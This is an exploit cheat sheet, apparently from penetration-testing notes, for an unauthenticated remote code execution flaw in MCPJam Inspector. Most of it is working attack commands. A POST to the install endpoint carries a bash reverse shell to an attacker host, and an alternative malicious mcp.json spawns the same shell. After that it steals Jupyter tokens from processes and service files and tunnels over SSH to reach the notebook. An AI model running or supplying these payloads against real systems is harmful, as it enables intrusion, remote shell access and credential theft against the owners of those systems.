# MCPJam Unauthenticated RCE (CVE-2026-23744)

MCPJam Inspector binds to `0.0.0.0` by default. The `/api/inspector/install` endpoint (or equivalent) accepts a user-controlled MCP server URL and spawns it as a subprocess without authentication.

```bash
# Identify MCPJam running (default port 6274):
nmap -p 6274 <TARGET>
curl http://<TARGET>:6274/api/version

# Exploit: install endpoint accepts arbitrary command via MCP server spec
curl -X POST http://<TARGET>:6274/api/inspector/install \
  -H 'Content-Type: application/json' \
  -d '{"serverUrl":"http://<LHOST>/mcp.json","command":"bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\""}'

# Or: supply a fake MCP server JSON that MCPJam fetches and runs:
# mcp.json: {"mcpServers": {"evil": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"]}}}
```

Post-shell: look for Jupyter Lab instances bound to localhost:
```bash
ps aux | grep jupyter
# Find token in: /etc/systemd/system/jupyter.service or process list --NotebookApp.token=<token>
ssh -L 8888:127.0.0.1:8888 <user>@<TARGET>   # tunnel
# Access: http://127.0.0.1:8888/?token=<token>
```
